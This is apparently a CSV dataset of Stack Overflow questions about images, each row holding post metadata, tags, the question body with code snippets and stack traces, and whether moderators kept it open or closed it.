PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
8390501,12/05/2011 19:08:51,974594,10/01/2011 15:20:24,120,0,Grails pass params to image,"How can i get i have an image, inside a each tag load dynamically by name, something like this:

     <g:link controller=""conferenceUser""><img src=""${resource(dir:'images',file:'solr.png')}"" height=""100px"" width=""200px""/></g:link>

but instead of file:'solr.png', have ${it.xxx} like this:

    <g:link controller=""conferenceUser""><img src=""${resource(dir:'images',file:'${it.xxx}.png')}"" height=""100px"" width=""200px""/></g:link>
                                                                                  ",image,grails,params,,,,open,0,125,5,"Grails pass params to image How can i get i have an image, inside a each tag load dynamically by name, something like this:

     <g:link controller=""conferenceUser""><img src=""${resource(dir:'images',file:'solr.png')}"" height=""100px"" width=""200px""/></g:link>

but instead of file:'solr.png', have ${it.xxx} like this:

    <g:link controller=""conferenceUser""><img src=""${resource(dir:'images',file:'${it.xxx}.png')}"" height=""100px"" width=""200px""/></g:link>
                                                                                  ",3
11627418,07/24/2012 08:56:20,1548079,07/24/2012 08:45:24,1,0,Exception in Flying Saucer when processing images for custom UserAgentCallback,"I've setup a test environment for Flying Saucer R8, and is testing building PDF's from templates and data. I'm using a custom UserAgentCallback to read external js/css and images locally from filesystem. The problem occured when introducing the following custom UserAgentCallback:

    package support;
    
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.InputStream;
    import java.net.MalformedURLException;
    import java.net.URL;
    
    import org.xhtmlrenderer.swing.NaiveUserAgent;
    
    public class FileUserAgent extends NaiveUserAgent {
        @Override
        public String resolveURI(String uri) {
        	URL url = null;
        	String path = null;
    		try {
    			url = new URL(uri);
    			path = url.getPath();
    		} catch (MalformedURLException e) {
    			// only path present
    			path = uri;
    		}
    		if (path.charAt(0) == '/') {
    			path = path.substring(1, path.length());
    		}
            return path;
        }
    
        @Override
        protected InputStream resolveAndOpenStream(String filepath) {
        	InputStream is = null;
            try {
            	File file = new File(filepath);
            	is = new FileInputStream(file);
            } catch (Exception e) {
            	System.out.print(""an error occured when reading resource: "" + e.getMessage());
            }
            return is;
        }
    }

The UserAgentCallback is able to read CSS without any problem, but when reading images either from src or background-image property i get the followng exception:

    java.lang.ClassCastException: org.xhtmlrenderer.swing.AWTFSImage$OldAWTFSImage cannot be cast to org.xhtmlrenderer.pdf.ITextFSImage
    	at org.xhtmlrenderer.pdf.ITextOutputDevice.drawImage(ITextOutputDevice.java:761)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintTiles(AbstractOutputDevice.java:300)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintBackground0(AbstractOutputDevice.java:245)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintBackground(AbstractOutputDevice.java:191)
    	at org.xhtmlrenderer.pdf.ITextOutputDevice.paintBackground(ITextOutputDevice.java:187)
    	at org.xhtmlrenderer.render.Box.paintBackground(Box.java:436)
    	at org.xhtmlrenderer.layout.Layer.paintBackgroundsAndBorders(Layer.java:243)
    	at org.xhtmlrenderer.layout.Layer.paint(Layer.java:329)
    	at org.xhtmlrenderer.pdf.ITextRenderer.paintPage(ITextRenderer.java:384)
    	at org.xhtmlrenderer.pdf.ITextRenderer.writePDF(ITextRenderer.java:348)
    	at org.xhtmlrenderer.pdf.ITextRenderer.createPDF(ITextRenderer.java:315)
    	at org.xhtmlrenderer.pdf.ITextRenderer.createPDF(ITextRenderer.java:246)",image,pdf,flyingsaucer,,,,open,0,468,10,"Exception in Flying Saucer when processing images for custom UserAgentCallback I've setup a test environment for Flying Saucer R8, and is testing building PDF's from templates and data. I'm using a custom UserAgentCallback to read external js/css and images locally from filesystem. The problem occured when introducing the following custom UserAgentCallback:

    package support;
    
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.InputStream;
    import java.net.MalformedURLException;
    import java.net.URL;
    
    import org.xhtmlrenderer.swing.NaiveUserAgent;
    
    public class FileUserAgent extends NaiveUserAgent {
        @Override
        public String resolveURI(String uri) {
        	URL url = null;
        	String path = null;
    		try {
    			url = new URL(uri);
    			path = url.getPath();
    		} catch (MalformedURLException e) {
    			// only path present
    			path = uri;
    		}
    		if (path.charAt(0) == '/') {
    			path = path.substring(1, path.length());
    		}
            return path;
        }
    
        @Override
        protected InputStream resolveAndOpenStream(String filepath) {
        	InputStream is = null;
            try {
            	File file = new File(filepath);
            	is = new FileInputStream(file);
            } catch (Exception e) {
            	System.out.print(""an error occured when reading resource: "" + e.getMessage());
            }
            return is;
        }
    }

The UserAgentCallback is able to read CSS without any problem, but when reading images either from src or background-image property i get the followng exception:

    java.lang.ClassCastException: org.xhtmlrenderer.swing.AWTFSImage$OldAWTFSImage cannot be cast to org.xhtmlrenderer.pdf.ITextFSImage
    	at org.xhtmlrenderer.pdf.ITextOutputDevice.drawImage(ITextOutputDevice.java:761)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintTiles(AbstractOutputDevice.java:300)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintBackground0(AbstractOutputDevice.java:245)
    	at org.xhtmlrenderer.render.AbstractOutputDevice.paintBackground(AbstractOutputDevice.java:191)
    	at org.xhtmlrenderer.pdf.ITextOutputDevice.paintBackground(ITextOutputDevice.java:187)
    	at org.xhtmlrenderer.render.Box.paintBackground(Box.java:436)
    	at org.xhtmlrenderer.layout.Layer.paintBackgroundsAndBorders(Layer.java:243)
    	at org.xhtmlrenderer.layout.Layer.paint(Layer.java:329)
    	at org.xhtmlrenderer.pdf.ITextRenderer.paintPage(ITextRenderer.java:384)
    	at org.xhtmlrenderer.pdf.ITextRenderer.writePDF(ITextRenderer.java:348)
    	at org.xhtmlrenderer.pdf.ITextRenderer.createPDF(ITextRenderer.java:315)
    	at org.xhtmlrenderer.pdf.ITextRenderer.createPDF(ITextRenderer.java:246)",3
3016164,06/10/2010 16:04:58,150363,08/04/2009 13:39:22,624,93,check image copyright,"Currently I am manually checking all client website(s) to make sure there are no copyright images (Getty).

Are there any tools/software that could be used to determine automatically if a website has any images that belong to Getty (or other similar companies?)",image,website,copyright,,,03/23/2011 15:21:58,off topic,1,41,3,"check image copyright Currently I am manually checking all client website(s) to make sure there are no copyright images (Getty).

Are there any tools/software that could be used to determine automatically if a website has any images that belong to Getty (or other similar companies?)",3
9077805,01/31/2012 10:17:21,1060686,11/22/2011 21:30:15,473,20,latex: \setlength{\parskip}{10pt} after begin{document} messes my images between paragraphs positions,"This is my document

    \documentclass[letterpaper]{article}
    \usepackage{graphicx}
    \usepackage{subfig}
    \usepackage{times}
    \usepackage{helvet}
    \usepackage{courier}
    \title{This is my title}
    \author{elcodedocle}
    \setcounter{secnumdepth}{0}
    
    \begin{document}
    \setlength{\parskip}{10pt}
    \maketitle
    \section{This is my section}

    This is my paragraph.
    
    \begin{figure}[h!]
    	\centering
    		\includegraphics[width=0.50\textwidth]{thisismyimage.jpeg}
    	\label{fig:Fig 1}
    	\caption{This is my image.}
    \end{figure}

    This is another paragraph.

    \begin{figure}[h!]
    	\centering
    		\includegraphics[width=0.50\textwidth]{thisisanotherimage.jpeg}
    	\label{fig:Fig 1}
    	\caption{This is another image.}
    \end{figure}

    ...

Can you tell me why it doesn't show right after adding \setlength{\parskip}{10pt} line?",image,latex,placement,,,01/31/2012 13:02:44,off topic,1,156,10,"latex: \setlength{\parskip}{10pt} after begin{document} messes my images between paragraphs positions This is my document

    \documentclass[letterpaper]{article}
    \usepackage{graphicx}
    \usepackage{subfig}
    \usepackage{times}
    \usepackage{helvet}
    \usepackage{courier}
    \title{This is my title}
    \author{elcodedocle}
    \setcounter{secnumdepth}{0}
    
    \begin{document}
    \setlength{\parskip}{10pt}
    \maketitle
    \section{This is my section}

    This is my paragraph.
    
    \begin{figure}[h!]
    	\centering
    		\includegraphics[width=0.50\textwidth]{thisismyimage.jpeg}
    	\label{fig:Fig 1}
    	\caption{This is my image.}
    \end{figure}

    This is another paragraph.

    \begin{figure}[h!]
    	\centering
    		\includegraphics[width=0.50\textwidth]{thisisanotherimage.jpeg}
    	\label{fig:Fig 1}
    	\caption{This is another image.}
    \end{figure}

    ...

Can you tell me why it doesn't show right after adding \setlength{\parskip}{10pt} line?",3
10574294,05/13/2012 18:46:11,993984,10/13/2011 17:10:03,44,6,TinyMCE image add from custom gallery with Ruby on Rails,"I use TinyMCE textarea editor in my Ruby on Rails project. I have db table with uploaded pictures. I have section with articles, so I need add some images to articles. 

My bad fast solution:
I have ""gallery"" until textarea with TinyMCE and when I click on image from gallery JS copy image link and add this link to the end of textarea. But this solution is not very good. 

Do you have any good suggestion/solution for ""add images to articles""? Wordpress have a nice ""engine"" for this my problem.
(sorry for my english)

I don't have to use TineMce, I can use whatever WYSIWYG editor.",image,tinymce,wysiwyg,,,,open,0,103,10,"TinyMCE image add from custom gallery with Ruby on Rails I use TinyMCE textarea editor in my Ruby on Rails project. I have db table with uploaded pictures. I have section with articles, so I need add some images to articles. 

My bad fast solution:
I have ""gallery"" until textarea with TinyMCE and when I click on image from gallery JS copy image link and add this link to the end of textarea. But this solution is not very good. 

Do you have any good suggestion/solution for ""add images to articles""? Wordpress have a nice ""engine"" for this my problem.
(sorry for my english)

I don't have to use TineMce, I can use whatever WYSIWYG editor.",3
10618368,05/16/2012 12:19:06,1349371,04/22/2012 10:08:05,1,0,imagecreatefrom function does not work for me,"I have a problem with imagecreatefrom() function of PHP. My code is like below:

    function addImageWhiteSpaces($imageSize, $fileType, $fileName)
    {
    	$finfo 		= finfo_open(FILEINFO_MIME_TYPE);
    	
    	if(!finfo_file($finfo, $fileName)) 
    		return FALSE;
    	else 
    	{	
    		if($fileType == DEFAULT_IMAGE_FILETYPE_PNG)
    			$image1	= imagecreatefrompng($fileName);
    		elseif($fileType == DEFAULT_IMAGE_FILETYPE_JPG || $fileType == DEFAULT_IMAGE_FILETYPE_JPEG)
    		{
    			$image1 = imagecreatefromjpeg($fileName);
    		}		
    		elseif($fileType == DEFAULT_IMAGE_FILETYPE_GIF)
    			$image1 = imagecreatefromgif($fileName);
    																																																																																																																																																	
    		$image1_x		= imagesx($image1);
    		$image1_y		= imagesy($image1);
    		
    		if($image1_x > 500 && $image1_y > 500)
    			return $fileName;
    		else 
    		{
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB50)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_50.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB74)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_74.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB114)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_114.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB300)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_300.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB500)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_500.png');
    				
    			$image_bg_x		= imagesx($image_bg);
    			$image_bg_y		= imagesy($image_bg);
    	
    			$imageStart_x	= 0;
    			$imageStart_y	= 0;
    			
    			if($image_bg_y > $image1_y)
    				$imageStart_y	= ($image_bg_y - $image1_y) / 2;
    			
    			if($image_bg_x > $image1_x)
    				$imageStart_x	= ($image_bg_x - $image1_x) / 2;
    			
    			
    			if(imagecopy($image_bg, $image1, $imageStart_x, $imageStart_y, 0, 0, $image1_x, $image1_y))
    				return $image_bg;
    			else
    				return FALSE;
    		}
    					
    //	OUTPUT IMAGE
    //	header(""Content-type: image/png"");
    //	imagejpeg($image_bg);
    	}
    }



When I put $fileName variable as a jpeg file, I get the fallowing error:

    A PHP Error was encountered
    
    Severity: Warning
    
    Message: imagecreatefromjpeg(): '/home/user/workspace/project/screens/' is not a valid JPEG file
    
    Filename: helpers/tools_helper.php
    
    Line Number: 2556


According the error, fileName can not be found correctly (ending with 'screens/', supposed to be '/screens/image.jpeg'), but when i print it on the screen I can see the full path. Moreover, my friend uses the same code and it works. I am using CodeIgniter and he uses only pure PHP. Is this problem related to CodeIgniter?

What I want to do is just merge two images(and image and a white background) ,whenever an image is not a square shaped, fill spaces with white background to make the image square. Any help will be very useful. Thanks.",image,codeigniter,gd,gd2,imagecreatefrompng,06/28/2012 19:07:37,too localized,1,502,7,"imagecreatefrom function does not work for me I have a problem with imagecreatefrom() function of PHP. My code is like below:

    function addImageWhiteSpaces($imageSize, $fileType, $fileName)
    {
    	$finfo 		= finfo_open(FILEINFO_MIME_TYPE);
    	
    	if(!finfo_file($finfo, $fileName)) 
    		return FALSE;
    	else 
    	{	
    		if($fileType == DEFAULT_IMAGE_FILETYPE_PNG)
    			$image1	= imagecreatefrompng($fileName);
    		elseif($fileType == DEFAULT_IMAGE_FILETYPE_JPG || $fileType == DEFAULT_IMAGE_FILETYPE_JPEG)
    		{
    			$image1 = imagecreatefromjpeg($fileName);
    		}		
    		elseif($fileType == DEFAULT_IMAGE_FILETYPE_GIF)
    			$image1 = imagecreatefromgif($fileName);
    																																																																																																																																																	
    		$image1_x		= imagesx($image1);
    		$image1_y		= imagesy($image1);
    		
    		if($image1_x > 500 && $image1_y > 500)
    			return $fileName;
    		else 
    		{
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB50)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_50.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB74)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_74.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB114)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_114.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB300)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_300.png');
    			if($imageSize == UPLOAD_DEFAULT_IMGTHUMB500)
    				$image_bg = imagecreatefrompng(PATH_MEDIA_IMG . 'white_bg_500.png');
    				
    			$image_bg_x		= imagesx($image_bg);
    			$image_bg_y		= imagesy($image_bg);
    	
    			$imageStart_x	= 0;
    			$imageStart_y	= 0;
    			
    			if($image_bg_y > $image1_y)
    				$imageStart_y	= ($image_bg_y - $image1_y) / 2;
    			
    			if($image_bg_x > $image1_x)
    				$imageStart_x	= ($image_bg_x - $image1_x) / 2;
    			
    			
    			if(imagecopy($image_bg, $image1, $imageStart_x, $imageStart_y, 0, 0, $image1_x, $image1_y))
    				return $image_bg;
    			else
    				return FALSE;
    		}
    					
    //	OUTPUT IMAGE
    //	header(""Content-type: image/png"");
    //	imagejpeg($image_bg);
    	}
    }



When I put $fileName variable as a jpeg file, I get the fallowing error:

    A PHP Error was encountered
    
    Severity: Warning
    
    Message: imagecreatefromjpeg(): '/home/user/workspace/project/screens/' is not a valid JPEG file
    
    Filename: helpers/tools_helper.php
    
    Line Number: 2556


According the error, fileName can not be found correctly (ending with 'screens/', supposed to be '/screens/image.jpeg'), but when i print it on the screen I can see the full path. Moreover, my friend uses the same code and it works. I am using CodeIgniter and he uses only pure PHP. Is this problem related to CodeIgniter?

What I want to do is just merge two images(and image and a white background) ,whenever an image is not a square shaped, fill spaces with white background to make the image square. Any help will be very useful. Thanks.",5
5027730,02/17/2011 10:30:46,621177,02/17/2011 10:30:46,1,0,Bulk/batch image resizer for Mac,"I need a good bulk image resizer for Mac, cos I'm tired of doing the thumbnails for my photo site by hand. I tried this one: http://ddd.ee/NIT_bulk_resize_and_watermark/ it's good and does the job but it's $19, is there a free alternative?",image,osx,resize,photo,watermark,04/29/2011 09:35:26,off topic,1,41,5,"Bulk/batch image resizer for Mac I need a good bulk image resizer for Mac, cos I'm tired of doing the thumbnails for my photo site by hand. I tried this one: http://ddd.ee/NIT_bulk_resize_and_watermark/ it's good and does the job but it's $19, is there a free alternative?",5
10549073,05/11/2012 09:47:11,1254581,03/07/2012 11:45:38,32,0,Slicing PNG files for the User Interface of a Windows program,"I am not familiar with Photoshop and graphic, what options should be selected on this dialog when slicing PNG files for the user interface of a Windows program? I just want to keep the image quality without loss. 

Thanks. 


![photoshop][1]


  [1]: http://i.stack.imgur.com/FqCTd.jpg",image,image-processing,graphics,png,photoshop,05/15/2012 23:08:24,off topic,1,43,11,"Slicing PNG files for the User Interface of a Windows program I am not familiar with Photoshop and graphic, what options should be selected on this dialog when slicing PNG files for the user interface of a Windows program? I just want to keep the image quality without loss. 

Thanks. 


![photoshop][1]


  [1]: http://i.stack.imgur.com/FqCTd.jpg",5
4011744,10/25/2010 03:33:17,486020,10/25/2010 03:33:17,1,0,about asynchronous　draw　method,Please teach the method to draw in 2D image by the asynchronous (each method of Windows API and DirectX). ,image,winapi,asynchronous,directx,drawing,10/27/2010 00:44:08,not a real question,1,20,2,about asynchronous　draw　method Please teach the method to draw in 2D image by the asynchronous (each method of Windows API and DirectX). ,5
9209540,02/09/2012 10:54:52,823528,06/30/2011 17:29:32,414,5,What should be the ideal thresholding technique for enhancing parts of the image?,"![enter image description here][1]


  [1]: http://i.stack.imgur.com/O7izk.jpg

What thresholding techique should i apply for the image in order to highlight the bright regions inside the image as well as the outer boundary..

The **im2bw** function does not give a good result 

Help!!",image,matlab,image-processing,threshold,,,open,0,40,13,"What should be the ideal thresholding technique for enhancing parts of the image? ![enter image description here][1]


  [1]: http://i.stack.imgur.com/O7izk.jpg

What thresholding techique should i apply for the image in order to highlight the bright regions inside the image as well as the outer boundary..

The **im2bw** function does not give a good result 

Help!!",4
7824733,10/19/2011 16:33:09,506706,11/13/2010 12:49:14,8,1,Rails - Mongrel Time out on file upload from phone,"I have a mobile app built using Rhomobile. When I launch an image upload from the phone to the rails server I end up with timeout issues on larger pictures (2+ MBs). I get an error in Mongrel on server side (Rails 2.3.8) and a CURL timeout error on the phone side. Is the timeout an issue from the phone or from the mongrel server?

Mongrel error:

    Wed Oct 19 09:07:05 -0500 2011: Error reading HTTP body: #<RuntimeError: Socket read returned insufficient data: 13515>
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:107:in `read_socket'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:86:in `read_body'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:55:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:149:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:149:in `process_client'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
    /usr/bin/mongrel_rails:19:in `load'
    /usr/bin/mongrel_rails:19

Error in Rhomobile App:

    Net| Operation finished with error 28: Timeout was reached
    Net|   CURLNetRequest: METHOD = [POST] URL = [http://www.mywebsite.com/updload/upload_image ] BODY = [] 

I use the AsyncHttp.upload_file command.

Thanks,

Nick",image,upload,timeout,mongrel,rhomobile,,open,0,221,10,"Rails - Mongrel Time out on file upload from phone I have a mobile app built using Rhomobile. When I launch an image upload from the phone to the rails server I end up with timeout issues on larger pictures (2+ MBs). I get an error in Mongrel on server side (Rails 2.3.8) and a CURL timeout error on the phone side. Is the timeout an issue from the phone or from the mongrel server?

Mongrel error:

    Wed Oct 19 09:07:05 -0500 2011: Error reading HTTP body: #<RuntimeError: Socket read returned insufficient data: 13515>
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:107:in `read_socket'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:86:in `read_body'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/http_request.rb:55:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:149:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:149:in `process_client'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
    /usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
    /usr/bin/mongrel_rails:19:in `load'
    /usr/bin/mongrel_rails:19

Error in Rhomobile App:

    Net| Operation finished with error 28: Timeout was reached
    Net|   CURLNetRequest: METHOD = [POST] URL = [http://www.mywebsite.com/updload/upload_image ] BODY = [] 

I use the AsyncHttp.upload_file command.

Thanks,

Nick",5
9981541,04/02/2012 18:12:39,852573,07/19/2011 17:55:39,1,0,Ghostscript 9.05 and 9.06 having issue with images on Sun platform,"When I display certain PDF files with the gs command (SUN OS - GPL Ghostscript GIT PRERELEASE 9.06 and 9.05 from 02-08-2012), the images are rendered fuzzy and the background and foreground colors are reversed.  This did not happen with the SUN 8.70 version or the 9.05 pre-release version we got back in November.  We first noticed the issue with the 9.05 version released on 02-08-2012.  Then, to see if it had been fixed, we installed the 9.06 pre-release version master last week, but the problem was still there.  This only happens with the SUN versions.  The Linux versions do not seem to have this issue.  I have reported this issue to the GhostScript http://bugs.ghostscript.com/show_bug.cgi?id=692962 - there is an example file attached to this bug.  Unfortunately, GhostScript does not seem to have a SUN box to test on and cannot duplicate the problem.  If anyone out there has this issue and/or a possible solution, please let me know.  You can respond to norris.george@yahoo.com or george.norris@baesystems.com

Here is our SUN platform information in more detail:
SunOS 5.10 Generic_141414-10 sun4u sparc SUNW,Netra-440

",image,ghostscript,sun,,,04/02/2012 19:39:46,off topic,1,187,11,"Ghostscript 9.05 and 9.06 having issue with images on Sun platform When I display certain PDF files with the gs command (SUN OS - GPL Ghostscript GIT PRERELEASE 9.06 and 9.05 from 02-08-2012), the images are rendered fuzzy and the background and foreground colors are reversed.  This did not happen with the SUN 8.70 version or the 9.05 pre-release version we got back in November.  We first noticed the issue with the 9.05 version released on 02-08-2012.  Then, to see if it had been fixed, we installed the 9.06 pre-release version master last week, but the problem was still there.  This only happens with the SUN versions.  The Linux versions do not seem to have this issue.  I have reported this issue to the GhostScript http://bugs.ghostscript.com/show_bug.cgi?id=692962 - there is an example file attached to this bug.  Unfortunately, GhostScript does not seem to have a SUN box to test on and cannot duplicate the problem.  If anyone out there has this issue and/or a possible solution, please let me know.  You can respond to norris.george@yahoo.com or george.norris@baesystems.com

Here is our SUN platform information in more detail:
SunOS 5.10 Generic_141414-10 sun4u sparc SUNW,Netra-440

",3
1138283,07/16/2009 15:05:56,130851,06/30/2009 06:12:55,8,0,Binding an Image source to TextBox.Text,"I am trying to bind the Text of a TextBox named 'txtImage' to an image using the following code with no results:

    <Image Source=""{Binding ElementName=txtImage, Path=Text}"" />

What would the right approach be?",image,binding,wpf,source,,,open,0,35,6,"Binding an Image source to TextBox.Text I am trying to bind the Text of a TextBox named 'txtImage' to an image using the following code with no results:

    <Image Source=""{Binding ElementName=txtImage, Path=Text}"" />

What would the right approach be?",4
9620377,03/08/2012 15:40:00,575090,01/14/2011 00:55:42,340,5,Imagine manipulation on Google App Engine,"I just found out that PIL functions on Google App Engine (GAE) are limited to only some basic functions.

I'm attempting to deploy a GAE app which is able to add text over the image and it is not possible to use GAE's Images Python API.

So right now, I'm hoping to look for alternatives:

 1. External service I can call to modify the image?",image,google-app-engine,image-processing,,,,open,0,63,6,"Imagine manipulation on Google App Engine I just found out that PIL functions on Google App Engine (GAE) are limited to only some basic functions.

I'm attempting to deploy a GAE app which is able to add text over the image and it is not possible to use GAE's Images Python API.

So right now, I'm hoping to look for alternatives:

 1. External service I can call to modify the image?",3
10300525,04/24/2012 14:56:36,1290418,03/24/2012 19:30:07,18,0,Software to add images to video?,I have video where I want to put images on my hand (in the video) and have them fly all over the video screen. Is their any software for Ubuntu 11.10 to do this or at least to insert an image into the video with a custom position as to where it is placed?,image,video,ubuntu,,,05/22/2012 13:56:21,off topic,1,54,6,Software to add images to video? I have video where I want to put images on my hand (in the video) and have them fly all over the video screen. Is their any software for Ubuntu 11.10 to do this or at least to insert an image into the video with a custom position as to where it is placed?,3
10562689,05/12/2012 09:56:39,581335,01/18/2011 20:11:03,533,3,How to fetch image of the screen from video memory?,"Which library may I use to do it? You can think of it as getting the screenshot.

Note: I'm talking about PC. I don't specify OS since I hope that the library is supposed to do it in a cross-platform way. If that's not possible then I will be fine with the Windows only solution.",image,memory,video,screen,fetch,,open,0,54,10,"How to fetch image of the screen from video memory? Which library may I use to do it? You can think of it as getting the screenshot.

Note: I'm talking about PC. I don't specify OS since I hope that the library is supposed to do it in a cross-platform way. If that's not possible then I will be fine with the Windows only solution.",5
